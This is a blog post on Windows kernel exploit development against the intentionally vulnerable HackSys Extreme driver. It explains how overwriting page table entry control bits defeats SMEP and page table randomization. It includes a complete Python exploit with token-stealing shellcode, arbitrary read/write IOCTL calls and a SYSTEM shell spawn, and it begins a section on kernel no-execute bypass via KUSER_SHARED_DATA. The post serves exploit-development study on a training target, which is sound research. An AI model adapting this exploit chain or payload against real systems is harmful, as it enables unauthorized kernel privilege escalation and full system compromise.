---
title:  "Exploit Development: Leveraging Page Table Entries for Windows Kernel Exploitation"
date:   2020-05-02
tags: [posts]
excerpt: "Exploiting page table entries through arbitrary read/write primitives to circumvent SMEP, no-execute (NX) in the kernel, and page table randomization."
---
Introduction
---

Taking the prerequisite knowledge from my [last blog post](https://connormcgarr.github.io/paging/), let's talk about additional ways to bypass [SMEP](https://en.wikipedia.org/wiki/Supervisor_Mode_Access_Prevention) other than [flipping the 20th bit of the CR4 register](https://connormcgarr.github.io/x64-Kernel-Shellcode-Revisited-and-SMEP-Bypass/) - or completely circumventing SMEP all together by bypassing [NX](https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/no-execute-nonpaged-pool) in the kernel! This blog post in particular will leverage page table entry control bits to bypass these kernel mode mitigations, as well as leveraging additional vulnerabilities such as an arbitrary read to bypass page table randomization to achieve said goals.

Before We Begin
---

[Morten Schenk](https://twitter.com/blomster81?lang=en) of Offensive Security has done a lot of the leg work for shedding light on this topic to the public, namely at [DEF CON 25](https://www.defcon.org/html/defcon-25/dc-25-index.html) and [Black Hat 2017](https://www.blackhat.com/us-17/).

Although there has been some _AMAZING_ research on this, I have not seen much in the way of _practical_ blog posts showcasing this technique in the wild (that is, taking an exploit start to finish leveraging this technique in a blog post). Most of the research surrounding this topic, although absolutely brilliant, only explains how these mitigation bypasses work. This led to some issues for me when I started applying this research into actual exploitation, as I only had theory to go off of.

Since I had some trouble implementing said research into a practical example, I'm writing this blog post in hopes it will aid those looking for more detail on how to leverage these mitigation bypasses in a practical manner.

This blog post is going to utilize the [HackSysExtreme](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/tree/v2.0.0/Driver) vulnerable kernel driver to outline bypassing SMEP and bypassing NX in the kernel. The vulnerability class will be an arbitrary read/write primitive, which can write one QWORD to kernel mode memory per [IOCTL](https://docs.microsoft.com/en-us/windows/win32/devio/device-input-and-output-control-ioctl-) routine.

Thank you to Ashfaq of HackSysTeam for this driver!

In addition to said information, these techniques will be utilized on a Windows 10 64-bit RS1 build. This is because Windows 10 RS2 has kernel Control Flow Guard (kCFG) enabled by default, which is beyond the scope of this post. This post simply aims to show the techniques used in today's "modern exploitation era" to bypass SMEP or NX in kernel mode memory.

Why Go to the Mountain, If You Can Bring the Mountain to You?
---

The adage for the title of this section, comes from Spencer Pratt's [WriteProcessMemory() white paper](https://www.exploit-db.com/papers/13660) about bypassing DEP. This saying, or adage, is extremely applicable to the method of bypassing SMEP through PTEs.

Let's start with some psuedo code!

```python
# Allocating user mode code
payload = kernel32.VirtualAlloc(
    c_int(0),                         # lpAddress
    c_int(len(shellcode)),            # dwSize
    c_int(0x3000),                    # flAllocationType
    c_int(0x40)                       # flProtect
)

---------------------------------------------------------

# Grabbing HalDispatchTable + 0x8 address
HalDispatchTable+0x8 = NTBASE + 0xFFFFFF

# Writing payload to HalDispatchTable + 0x8
www.What = payload
www.Where = HalDispatchTable + 0x8

---------------------------------------------------------

# Spawning SYSTEM shell
print "[+] Enjoy the NT AUTHORITY\SYSTEM shell!!!!"
os.system("cmd.exe /K cd C:\\")
```

> Note, the above code is syntactically incorrect, but it is there nonetheless to help us understand what is going on.

Also, before moving on, write-what-where = arbitrary memory overwrite = arbitrary write primitive.

Carrying on, the above psuedo code snippet is allocating virtual memory in user mode, via [VirtualAlloc()](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc). Then, utilizing the write-what-where vulnerability in the kernel mode driver, the shellcode's virtual address (residing in user mode), get's written to `nt!HalDispatchTable+0x8` (residing in kernel mode), which is a very common technique to use in an arbitrary memory overwrite situation.

Please refer to my [last post](https://connormcgarr.github.io/Kernel-Exploitation-2/) on how this technique works.

As it stands now, execution of this code will result in an `ATTEMPTED_EXECUTE_OF_NOEXECUTE_MEMORY` [Bug Check](https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/bug-check-code-reference2). This Bug Check is indicative of SMEP kicking in.

Letting the code execute, we can see this is the case.

Here, we can clearly see our shellcode has been allocated at `0x2620000`

<img src="{{ site.url }}{{ site.baseurl }}/images/PTE_2.png" alt="">

SMEP kicks in, and we can see the offending address is that of our user mode shellcode (`Arg2` of `PTE contents` is highlighted as well. We will circle back to this in a moment).

<img src="{{ site.url }}{{ site.baseurl }}/images/PTE_1.png" alt="">

Recall, from a [previous blog](https://connormcgarr.github.io/x64-Kernel-Shellcode-Revisited-and-SMEP-Bypass/) of mine, that SMEP kicks in whenever code that resides in current privilege level (CPL 3) of the CPU (CPL 3 code = user mode code) is executed in context of CPL 0 (kernel mode).

SMEP is triggered in this case, as we are attempting to access the shellcode's virtual address in user mode from `nt!HalDispatchTable+0x8`, which is in kernel mode.

But _HOW_ is SMEP implemented is the real question. 

SMEP is mandated/enabled through the OS via the 20th bit of the CR4 control register.

<img src="{{ site.url }}{{ site.baseurl }}/images/PTE_4.png" alt="">

The 20th bit in the above image refers to the `1` in the beginning of CR4 register's value of `0x170678`, meaning SMEP is enabled on this system globally.

However, SMEP is _ENFORCED_ on a per memory page basis, via the `U/S` PTE control bit. This is what we are going shift our focus to in this post.

[Alex Ionescu](https://twitter.com/aionescu) gave a [talk](https://web.archive.org/web/20180417030210/http://www.alex-ionescu.com/infiltrate2015.pdf) at Infiltrate 2015 about the implementation of SMEP on a per page basis.

Citing his slides, he explains that Intel has the following to say about SMEP enforcement on a per page basis.

> "Any page level marked as supervisor (U/S=0) will result in treatment as supervisor for SMEP enforcement."

Let's take a look at the output of `!pte` in WinDbg of our user mode shellcode page to make sense of all of this!

<img src="{{ site.url }}{{ site.baseurl }}/images/PTE_3.png" alt="">

What Intel means by the their statement in Alex's talk, is that only ONE of the paging structure table entries (a page table entry) is needed to be set to kernel, in order for SMEP to not trigger. We do not need all 4 entries to be supervisor (kernel) mode!

This is wonderful for us, from an exploit development standpoint - as this _GREATLY_ reduces our workload (we will see why shortly)!

Let's learn how we can leverage this new knowledge, by first examining the current PTE control bits of our shellcode page:

1. `D` - The "dirty" bit has been set, meaning a write to this address has occurred (`KERNELBASE!VirtualAlloc()`).
2. `A` - The "access" bit has been set, meaning this address has been referenced at some point.
3. `U` - The "user" bit has been set here. When the memory manager unit reads in this address, it recognizes is as a user mode address. When this bit is 1, the page is user mode. When this bit is clear, the page is kernel mode.
4. `W` - The "write" bit has been set here, meaning this memory page is writable.
5. `E` - The "executable" bit has been set here, meaning this memory page is executable.
6. `V` - The "valid" bit is set here, meaning that the PTE is a valid PTE.

Notice that most of these control bits were set with our call earlier to `KERNELBASE!VirtualAlloc()` in the psuedo code snippet via the function's arguments of `flAllocationType` and `flProtect`.

Where Do We Go From Here?
---
Let's shift our focus to the PTE entry from the `!pte` command output in the last screenshot. We can see that our entry is that of a user mode page, from the `U/S` bit being set. However, what if we cleared this bit out? 

If the `U/S` bit is set to 0, the page should become a kernel mode page, based on the aforementioned information. Let's investigate this in WinDbg.

Rebooting our machine, we reallocate our shellcode in user mode.

<img src="{{ site.url }}{{ site.baseurl }}/images/PTE_5.png" alt="">

The above image performs the following actions:

1. Shows our shellcode in a user mode allocation at the virtual address `0xc60000`
2. Shows the current PTE and control bits for our shellcode memory page
3. Uses `ep` in WinDbg to overwrite the pointer at `0xFFFFF98000006300` (this is the address of our PTE. When dereferenced, it contains the actual PTE control bits)
4. Clears the PTE control bit for `U/S` by subtracting `4` from the PTE control bit contents.
> Note, I found this to be the correct value to clear the `U/S` bit through trial and error.

After the `U/S` bit is cleared out, our exploit continues by overwriting `nt!HalDispatchTable+0x8` with the pointer to our shellcode.

<img src="{{ site.url }}{{ site.baseurl }}/images/PTE_6.png" alt="">

The exploit continues, with a call to `nt!KeQueryIntervalProfile()`, which in turn, calls `nt!HalDispatchTable+0x8`

<img src="{{ site.url }}{{ site.baseurl }}/images/PTE_7.png" alt="">

Stepping into the `call qword ptr [nt!HalDispatchTable+0x8]` instruction, we have hit our shellcode address and it has been loaded into RIP!

<img src="{{ site.url }}{{ site.baseurl }}/images/PTE_8.png" alt="">

Executing the shellcode, results in manual bypass of SMEP!

<img src="{{ site.url }}{{ site.baseurl }}/images/PTE_9a.png" alt="">

Let's refer back to the phraseology earlier in the post that uttered:

> Why go to the mountain, if you can bring the mountain to you?

Notice how we didn't "disable" SMEP like we did a few blog posts ago with ROP. All we did this time was just play by SMEP's rules! We didn't go to SMEP and try to disable it, instead, we brought our shellcode to SMEP and said "treat this as you normally treat kernel mode memory."

This is great, we know we can bypass SMEP through this method! But the question remains, how can we achieve this dynamically?

After all, we cannot just arbitrarily use WinDbg when exploiting other systems.

Calculating PTEs
---

The previously shown method of bypassing SMEP manually in WinDbg revolved around the fact we could dereference the PTE address of our shellcode page in memory and extract the control bits. The question now remains, can we do this dynamically without a debugger?

Our exploit not only gives us the ability to arbitrarily write, but it gives us the ability to arbitrarily read in data as well! We will be using this read primitive to our advantage.

Windows has an API for just about anything! Fetching the PTE for an associated virtual address is no different. Windows has an API called `nt!MiGetPteAddress` that performs a specific formula to retrieve the associated PTE of a memory page.

<img src="{{ site.url }}{{ site.baseurl }}/images/PTE_10.png" alt="">

The above function performs the following instructions:

1. Bitwise shifts the contents of the RCX register to the right by 9 bits
2. Moves the value of `0x7FFFFFFFF8` into RAX
3. Bitwise AND's the values of RCX and RAX together
4. Moves the value of `0xFFFFFE0000000000` into RAX
5. Adds the values of RAX and RCX
6. Performs a return out of the function

Let's take a second to break this down by importance. First things first, the number `0xFFFFFE0000000000` looks like it could potentially be important - as it resembles a 64-bit virtual memory address.

Turns out, this is important. This number is actually a memory address, and it is the base address of all of the PTEs! Let's talk about the base of the PTEs for a second and its significance.

Rebooting the machine and disassembling the function again, we notice something.

<img src="{{ site.url }}{{ site.baseurl }}/images/PTE_11.png" alt="">

`0xFFFFFE0000000000` has now changed to `0xFFFF800000000000`. The base of the PTEs has changed, it seems.

This is due to page table randomization, a mitigation of Windows 10. Microsoft _definitely_ had the right idea to implement this mitigation, but it is not much of a use to be honest if the attacker already has an abitrary read primitive.

An attacker needs an arbitrary read primitive in the first place to extract the contents of the PTE control bits by dereferencing the PTE of a given memory page.

If an attacker already has this ability, the adversary could just use the same primitive to read in `nt!MiGetPteAddress+0x13`, which, when dereferenced, contains the base of the PTEs.

Again, not ripping on Microsoft - I think they honestly have some of the best default OS exploit mitigations in the business. Just something I thought of.

The method of reusing an arbitrary read primitive is actually what we are going to do here! But before we do, let's talk about the PTE formula one last time.

As we saw, a bitwise shift right operation is performed on the contents of the RCX register. That is because when this function is called, the virtual address for the PTE you would like to fetch gets loaded into RCX.

We can mimic this same behavior in Python also!

```python
# Bitwise shift shellcode virtual address to the right 9 bits
shellcode_pte = shellcode_virtual_address >> 9

# Bitwise AND the bitwise shifted right shellcode virtual address with 0x7ffffffff8
shellcode_pte &= 0x7ffffffff8

# Add the base of the PTEs to the above value (which will need to be previously extracted with an arbitrary read)
shellcode_pte += base_of_ptes
```

The variable `shellcode_pte` will now contain the PTE for our shellcode page! We can demonstrate this behavior in WinDbg.

<img src="{{ site.url }}{{ site.baseurl }}/images/PTE_12.png" alt="">

Sorry for the poor screenshot above in advance.

But as we can see, our version of the formula works - and we know can now dynamically fetch a PTE address! The only question remains, how do we dynamically dereference `nt!MiGetPteAddress+0x13` with an arbitrary read?

Read, Read, Read!
---

To use our arbitrary read, we are actually going to use our arbitrary write!

Our write-what-where primitive allows us to write a pointer (the what) to a pointer (the where). The school of thought here, is to write the address of `nt!MiGetPteAddress+0x13` (the what) to a [c_void_p()](https://docs.python.org/3/library/ctypes.html#ctypes.c_void_p) data type, which is Python's representation of a C void pointer.

What will happen here is the following:

1. Since the write portion of the write-what-where writes a POINTER (a.k.a the write will take a memory address and dereference it - which results in extracting the contents of a pointer), we will write the value of `nt!MiGetPteAddress+0x13` somewhere we control. The write primitive will extract what `nt!MiGetPteAddress+0x13` points to, which is the base of the PTEs, and write it somewhere we can fetch the result!
2. The "where" value in the write-what-were vulnerability will write the "what" value (base of the PTEs) to a pointer (a.k.a if the "what" value (base of the PTEs) gets written to `0xFFFFFFFFFFFFFFFF`, that means `0xFFFFFFFFFFFFFFFF` will now POINT to the "what" value, which is the base of the PTEs).

The thought process here is, if we write the base of the PTEs to OUR OWN pointer that we create - we can then dereference our pointer and extract the contents ourselves!

Here is how this all looks in Python!

First, we declare a structure (one member for the "what" value, one member for the "where" value)

```python
# Fist structure, for obtaining nt!MiGetPteAddress+0x13 value
class WriteWhatWhere_PTE_Base(Structure):
    _fields_ = [
        ("What_PTE_Base", c_void_p),
        ("Where_PTE_Base", c_void_p)
    ]
```

Secondly, we fetch the memory address of `nt!MiGetPteAddress+0x13`
> Note - your offset from the kernel base to this function may be different!

```python
# Retrieving nt!MiGetPteAddress (Windows 10 RS1 offset)
nt_mi_get_pte_address = kernel_address + 0x51214

# Base of PTEs is located at nt!MiGetPteAddress + 0x13
pte_base = nt_mi_get_pte_address + 0x13
```

Thirdly, we declare a `c_void_p()` to store the value pointed to by `nt!MiGetPteAddress+0x13`

```python
# Creating a pointer in which the contents of nt!MiGetPteAddress+0x13 will be stored in to
# Base of the PTEs are stored here
base_of_ptes_pointer = c_void_p()
```

Fourthly, we initialize our structure with our "what" value and our "where" value which writes what the actual address of `nt!MiGetPteAddress+0x13` points to (the base of the PTEs) into our declared pointer.

```python
# Write-what-where structure #1
www_pte_base = WriteWhatWhere_PTE_Base()
www_pte_base.What_PTE_Base = pte_base
www_pte_base.Where_PTE_Base = addressof(base_of_ptes_pointer)
www_pte_pointer = pointer(www_pte_base)
```

Notice the where is the address of the pointer `addressof(base_of_ptes_pointer)`. This is because we don't want to overwrite the `c_void_p`'s address with anything - we want to store the value inside of the pointer.

This will store the value inside of the pointer because our write-what-where primitive writes a "what" value to a pointer.

Next, we make an IOCTL call to the routine that jumps to the arbitrary write in the driver.

```python
# 0x002200B = IOCTL code that will jump to TriggerArbitraryOverwrite() function
kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x0022200B,                         # dwIoControlCode
    www_pte_pointer,                    # lpInBuffer
    0x8,                                # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)
```

A little Python ctypes magic here on dereferencing pointers.

```python
# CTypes way of dereferencing a C void pointer
base_of_ptes = struct.unpack('<Q', base_of_ptes_pointer)[0]
```

The above snippet of code will read in the `c_void_p()` (which contains the base of the PTEs) and store it in the variable `base_of_ptes`.

Utilizing the base of the PTEs, we can now dynamically retrieve the location of our shellcode's PTE by putting all of the code together!

<img src="{{ site.url }}{{ site.baseurl }}/images/PTE_13aaaaa.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/PTE_LEAK.png" alt="">

We have successfully defeated page table randomization!

Read, Read, Read... Again!
---

Now that we have dynamically resolved the PTE address for our shellcode, we need to use our arbitrary read again to dereference the shellcode's PTE and extract the PTE control bits so we can modify the page table entry to be kernel mode.

Using the same primitive as above, we can use Python again to dynamically retrieve all of this!

Firstly, we need to create another structure (again, one member for "what" and one member for "where").

```python
# Second structure, for obtaining the control bits for the PTE
class WriteWhatWhere_PTE_Control_Bits(Structure):
    _fields_ = [
        ("What_PTE_Control_Bits", c_void_p),
        ("Where_PTE_Control_Bits", c_void_p)
    ]
```

Secondly, we declare another `c_void_p`.

```python
shellcode_pte_bits_pointer = c_void_p()
```

Thirdly, we initialize our structure with the appropriate variables

```python
# Write-what-where structure #2
www_pte_bits = WriteWhatWhere_PTE_Control_Bits()
www_pte_bits.What_PTE_Control_Bits = shellcode_pte
www_pte_bits.Where_PTE_Control_Bits = addressof(shellcode_pte_bits_pointer)
www_pte_bits_pointer = pointer(www_pte_bits)
```

We then make another call to the IOCTL responsible for the vulnerability.

Before executing our updated exploit, let's restart the computer to prove everything is working dynamically.

Our combined code executes - resulting in the extraction of the PTE control bits!

<img src="{{ site.url }}{{ site.baseurl }}/images/PTE_15.png" alt="">

Awesome! All that is left now that is to modify the `U/S` bit of the PTE control bits and then execute our shellcode!

Write, Write, Write!
---

Now that we have read in all of the information we need, it is time to modify the PTE of the shellcode memory page. To do this, all we need to do is subtract the extracted PTE control bits by 4.

```python
# Currently, the PTE control bit for U/S of the shellcode is that of a user mode memory page
# Flipping the U (user) bit to an S (supervisor/kernel) bit
shellcode_pte_control_bits_kernelmode = shellcode_pte_control_bits_usermode - 4
```

Now we have successfully gotten the value we would like to write over our current PTE, it is time to actually make the write.

To do this, we first setup a structure, just like the read primitive.

```python
# Third structure, to overwrite the U (user) PTE control bit to an S (supervisor/kernel) bit
class WriteWhatWhere_PTE_Overwrite(Structure):
    _fields_ = [
        ("What_PTE_Overwrite", c_void_p),
        ("Where_PTE_Overwrite", c_void_p)
    ]
```

This time, however, we store the PTE bits in a pointer so when the write occurs, it writes the bits instead of trying to extract the memory address of `2000000046b0f867` - which is not a valid address.

```python
# Need to store the PTE control bits as a pointer
# Using addressof(pte_overwrite_pointer) in Write-what-where structure #4 since a pointer to the PTE control bits are needed
pte_overwrite_pointer = c_void_p(shellcode_pte_control_bits_kernelmode)
```

Then, we initialize the structure again.

```python
# Write-what-where structure #4
www_pte_overwrite = WriteWhatWhere_PTE_Overwrite()
www_pte_overwrite.What_PTE_Overwrite = addressof(pte_overwrite_pointer)
www_pte_overwrite.Where_PTE_Overwrite = shellcode_pte
www_pte_overwrite_pointer = pointer(www_pte_overwrite)
```

After everything is good to go, we make another IOCTL call to trigger the vulnerability, and we successfully turn our user mode page into a kernel mode page dynamically!

<img src="{{ site.url }}{{ site.baseurl }}/images/PTE_14.png" alt="">

Goodbye, SMEP (v2 ft. PTE Overwrite)!
---

All that is left to do now is execute our shellcode via `nt!HalDispatchTable+0x8` and `nt!KeQueryIntervalProfile()`. Since I have already done a post outlining how this works, I will [link](https://connormcgarr.github.io/Kernel-Exploitation-2/) you to it so you can see how this actually executes our shellcode. This blog post assumes the reader has minimal knowledge of arbitrary memory overwrites to begin with.

Here is the final exploit, which can also be found on [my GitHub](https://github.com/connormcgarr/AWE-OSEE-Prep/blob/master/Kernel/Arbitrary%20Memory%20Overwrites/x64_HEVD_Windows_10_SMEP_Bypass_Arbitrary_Overwrite.py).

```python
# HackSysExtreme Vulnerable Driver Kernel Exploit (x64 Arbitrary Overwrite/SMEP Enabled)
# Windows 10 RS1 - SMEP Bypass via PTE Overwrite
# Author: Connor McGarr

import struct
import sys
import os
from ctypes import *

kernel32 = windll.kernel32
ntdll = windll.ntdll
psapi = windll.Psapi

# Fist structure, for obtaining nt!MiGetPteAddress+0x13 value
class WriteWhatWhere_PTE_Base(Structure):
    _fields_ = [
        ("What_PTE_Base", c_void_p),
        ("Where_PTE_Base", c_void_p)
    ]

# Second structure, for obtaining the control bits for the PTE
class WriteWhatWhere_PTE_Control_Bits(Structure):
    _fields_ = [
        ("What_PTE_Control_Bits", c_void_p),
        ("Where_PTE_Control_Bits", c_void_p)
    ]

# Third structure, to overwrite the U (user) PTE control bit to an S (supervisor/kernel) bit
class WriteWhatWhere_PTE_Overwrite(Structure):
    _fields_ = [
        ("What_PTE_Overwrite", c_void_p),
        ("Where_PTE_Overwrite", c_void_p)
    ]

# Fourth structure, to overwrite HalDispatchTable + 0x8 with kernel mode shellcode page
class WriteWhatWhere(Structure):
    _fields_ = [
        ("What", c_void_p),
        ("Where", c_void_p)
    ]

# Token stealing payload
payload = bytearray(
    "\x65\x48\x8B\x04\x25\x88\x01\x00\x00"              # mov rax,[gs:0x188]  ; Current thread (KTHREAD)
    "\x48\x8B\x80\xB8\x00\x00\x00"                      # mov rax,[rax+0xb8]  ; Current process (EPROCESS)
    "\x48\x89\xC3"                                      # mov rbx,rax         ; Copy current process to rbx
    "\x48\x8B\x9B\xF0\x02\x00\x00"                      # mov rbx,[rbx+0x2f0] ; ActiveProcessLinks
    "\x48\x81\xEB\xF0\x02\x00\x00"                      # sub rbx,0x2f0       ; Go back to current process
    "\x48\x8B\x8B\xE8\x02\x00\x00"                      # mov rcx,[rbx+0x2e8] ; UniqueProcessId (PID)
    "\x48\x83\xF9\x04"                                  # cmp rcx,byte +0x4   ; Compare PID to SYSTEM PID
    "\x75\xE5"                                          # jnz 0x13            ; Loop until SYSTEM PID is found
    "\x48\x8B\x8B\x58\x03\x00\x00"                      # mov rcx,[rbx+0x358] ; SYSTEM token is @ offset _EPROCESS + 0x358
    "\x80\xE1\xF0"                                      # and cl, 0xf0        ; Clear out _EX_FAST_REF RefCnt
    "\x48\x89\x88\x58\x03\x00\x00"                      # mov [rax+0x358],rcx ; Copy SYSTEM token to current process
    "\x48\x31\xC0"                                      # xor rax,rax         ; set NTSTATUS SUCCESS
    "\xC3"                                              # ret                 ; Done!
)

# Defeating DEP with VirtualAlloc. Creating RWX memory, and copying the shellcode in that region.
print "[+] Allocating RWX region for shellcode"
ptr = kernel32.VirtualAlloc(
    c_int(0),                         # lpAddress
    c_int(len(payload)),              # dwSize
    c_int(0x3000),                    # flAllocationType
    c_int(0x40)                       # flProtect
)

# Creates a ctype variant of the payload (from_buffer)
c_type_buffer = (c_char * len(payload)).from_buffer(payload)

print "[+] Copying shellcode to newly allocated RWX region"
kernel32.RtlMoveMemory(
    c_int(ptr),                       # Destination (pointer)
    c_type_buffer,                    # Source (pointer)
    c_int(len(payload))               # Length
)

# Print update statement for shellcode location
print "[+] Shellcode is located at {0}".format(hex(ptr))

# Creating a pointer for the shellcode (write-what-where writes a pointer to a pointer)
# Using addressof(shellcode_pointer) in Write-what-where structure #5
shellcode_pointer = c_void_p(ptr)

# c_ulonglong because of x64 size (unsigned __int64)
base = (c_ulonglong * 1024)()

print "[+] Calling EnumDeviceDrivers()..."
get_drivers = psapi.EnumDeviceDrivers(
    byref(base),                      # lpImageBase (array that receives list of addresses)
    sizeof(base),                     # cb (size of lpImageBase array, in bytes)
    byref(c_long())                   # lpcbNeeded (bytes returned in the array)
)

# Error handling if function fails
if not base:
    print "[+] EnumDeviceDrivers() function call failed!"
    sys.exit(-1)

# The first entry in the array with device drivers is ntoskrnl base address
kernel_address = base[0]

# Print update for ntoskrnl.exe base address
print "[+] Found kernel leak!"
print "[+] ntoskrnl.exe base address: {0}".format(hex(kernel_address))

# Phase 1: Grab the base of the PTEs via nt!MiGetPteAddress

# Retrieving nt!MiGetPteAddress (Windows 10 RS1 offset)
nt_mi_get_pte_address = kernel_address + 0x51214

# Print update for nt!MiGetPteAddress address 
print "[+] nt!MiGetPteAddress is located at: {0}".format(hex(nt_mi_get_pte_address))

# Base of PTEs is located at nt!MiGetPteAddress + 0x13
pte_base = nt_mi_get_pte_address + 0x13

# Print update for nt!MiGetPteAddress+0x13 address
print "[+] nt!MiGetPteAddress+0x13 is located at: {0}".format(hex(pte_base))

# Creating a pointer in which the contents of nt!MiGetPteAddress+0x13 will be stored in to
# Base of the PTEs are stored here
base_of_ptes_pointer = c_void_p()

# Write-what-where structure #1
www_pte_base = WriteWhatWhere_PTE_Base()
www_pte_base.What_PTE_Base = pte_base
www_pte_base.Where_PTE_Base = addressof(base_of_ptes_pointer)
www_pte_pointer = pointer(www_pte_base)

# Getting handle to driver to return to DeviceIoControl() function
handle = kernel32.CreateFileA(
    "\\\\.\\HackSysExtremeVulnerableDriver", # lpFileName
    0xC0000000,                         # dwDesiredAccess
    0,                                  # dwShareMode
    None,                               # lpSecurityAttributes
    0x3,                                # dwCreationDisposition
    0,                                  # dwFlagsAndAttributes
    None                                # hTemplateFile
)

# 0x002200B = IOCTL code that will jump to TriggerArbitraryOverwrite() function
kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x0022200B,                         # dwIoControlCode
    www_pte_pointer,                    # lpInBuffer
    0x8,                                # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)

# CTypes way of dereferencing a C void pointer
base_of_ptes = struct.unpack('<Q', base_of_ptes_pointer)[0]

# Print update for PTE base
print "[+] Leaked base of PTEs!"
print "[+] Base of PTEs are located at: {0}".format(hex(base_of_ptes))

# Phase 2: Calculate the shellcode's PTE address

# Calculating the PTE for shellcode memory page
shellcode_pte = ptr >> 9
shellcode_pte &= 0x7ffffffff8
shellcode_pte += base_of_ptes

# Print update for Shellcode PTE
print "[+] PTE for the shellcode memory page is located at {0}".format(hex(shellcode_pte))

# Phase 3: Extract shellcode's PTE control bits

# Declaring C void pointer to store shellcode PTE control bits
shellcode_pte_bits_pointer = c_void_p()

# Write-what-where structure #2
www_pte_bits = WriteWhatWhere_PTE_Control_Bits()
www_pte_bits.What_PTE_Control_Bits = shellcode_pte
www_pte_bits.Where_PTE_Control_Bits = addressof(shellcode_pte_bits_pointer)
www_pte_bits_pointer = pointer(www_pte_bits)

# 0x002200B = IOCTL code that will jump to TriggerArbitraryOverwrite() function
kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x0022200B,                         # dwIoControlCode
    www_pte_bits_pointer,               # lpInBuffer
    0x8,                                # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)

# CTypes way of dereferencing a C void pointer
shellcode_pte_control_bits_usermode = struct.unpack('<Q', shellcode_pte_bits_pointer)[0]

# Print update for PTE control bits
print "[+] PTE control bits for shellcode memory page: {:016x}".format(shellcode_pte_control_bits_usermode)

# Phase 4: Overwrite current PTE U/S bit for shellcode page with an S (supervisor/kernel)

# Currently, the PTE control bit for U/S of the shellcode is that of a user mode memory page
# Flipping the U (user) bit to an S (supervisor/kernel) bit
shellcode_pte_control_bits_kernelmode = shellcode_pte_control_bits_usermode - 4

# Need to store the PTE control bits as a pointer
# Using addressof(pte_overwrite_pointer) in Write-what-where structure #4 since a pointer to the PTE control bits are needed
pte_overwrite_pointer = c_void_p(shellcode_pte_control_bits_kernelmode)

# Write-what-where structure #4
www_pte_overwrite = WriteWhatWhere_PTE_Overwrite()
www_pte_overwrite.What_PTE_Overwrite = addressof(pte_overwrite_pointer)
www_pte_overwrite.Where_PTE_Overwrite = shellcode_pte
www_pte_overwrite_pointer = pointer(www_pte_overwrite)

# Print update for PTE overwrite
print "[+] Goodbye SMEP..."
print "[+] Overwriting shellcodes PTE user control bit with a supervisor control bit..."

# 0x002200B = IOCTL code that will jump to TriggerArbitraryOverwrite() function
kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x0022200B,                         # dwIoControlCode
    www_pte_overwrite_pointer,          # lpInBuffer
    0x8,                                # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)

# Print update for PTE overwrite round 2
print "[+] User mode shellcode page is now a kernel mode page!"

# Phase 5: Shellcode

# nt!HalDispatchTable address (Windows 10 RS1 offset)
haldispatchtable_base_address = kernel_address + 0x2f1330

# nt!HalDispatchTable + 0x8 address
haldispatchtable = haldispatchtable_base_address + 0x8

# Print update for nt!HalDispatchTable + 0x8
print "[+] nt!HalDispatchTable + 0x8 is located at: {0}".format(hex(haldispatchtable))

# Write-what-where structure #5
www = WriteWhatWhere()
www.What = addressof(shellcode_pointer)
www.Where = haldispatchtable
www_pointer = pointer(www)

# 0x002200B = IOCTL code that will jump to TriggerArbitraryOverwrite() function
print "[+] Interacting with the driver..."
kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x0022200B,                         # dwIoControlCode
    www_pointer,                        # lpInBuffer
    0x8,                                # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)

# Actually calling NtQueryIntervalProfile function, which will call HalDispatchTable + 0x8, where the shellcode will be waiting.
ntdll.NtQueryIntervalProfile(
    0x1234,
    byref(c_ulonglong())
)

# Print update for shell
print "[+] Enjoy the NT AUTHORITY\SYSTEM shell!"
os.system("cmd.exe /K cd C:\\")
```

NT AUTHORITY\SYSTEM!
---

<img src="{{ site.url }}{{ site.baseurl }}/images/SMEP_1.gif" alt="">

Rinse and Repeat
---

Did you think I forgot about you, kernel no-execute (NX)?

Let's say that for some reason, you are against the method of allocating user mode code. There are many reasons for that, one of them being EDR hooking of crucial functions like `VirtualAlloc()`.

Let's say you want to take advantage of various defensive tools and their lack of visibility into kernel mode. How can we leverage already existing kernel mode memory in the same manner?

Okay, This Time We Are Going To The Mountain! `KUSER_SHARED_DATA` Time!
---

Morten in his research [suggests](https://www.blackhat.com/docs/us-17/wednesday/us-17-Schenk-Taking-Windows-10-Kernel-Exploitation-To-The-Next-Level%E2%80%93Leveraging-Write-What-Where-Vulnerabilities-In-Creators-Update.pdf) that another suitable method may be to utilize the [KUSER_SHARED_DATA]() structure in the kernel directly, similarly to how ROP works in user mode.

The concept of ROP in user mode is the idea that we have the ability to write shellcode to the stack, we just don't have the ability to execute it. Using ROP, we can change the permissions of the stack to that of executable, and execute our shellcode from there.

The concept here is no different. We can write our shellcode to `KUSER_SHARED_DATA+0x800`, because it is a kernel mode page with writeable permissions.

Using our write and read primtives, we can then flip the NX bit (similar to ROP in user mode) and make the kernel mode memory executable!

The questions still remains, why `KUSER_SHARED_DATA`?

Static Electricity
---

Windows has slowly but surely dried up all of the static addresses used by exploit developers over the years. One of the last structures that many people used for kASLR bypasses, was the lack of randomization of the HAL heap. The HAL heap used to contain a pointer to the kernel AND be static, but no longer is static.

Although everything is dynamically based, there is still a structure that remains which is static, `KUSER_SHARED_DATA`.

This structure, [according to](https://www.geoffchappell.com/studies/windows/km/ntoskrnl/structs/kuser_shared_data/index.htm) Geoff Chappell, is used to define the layout of data that the kernel shares with user mode.

The issue is, this structure is static at the address `0xFFFFF78000000000`!

<img src="{{ site.url }}{{ site.baseurl }}/images/PTE_16.png" alt="">

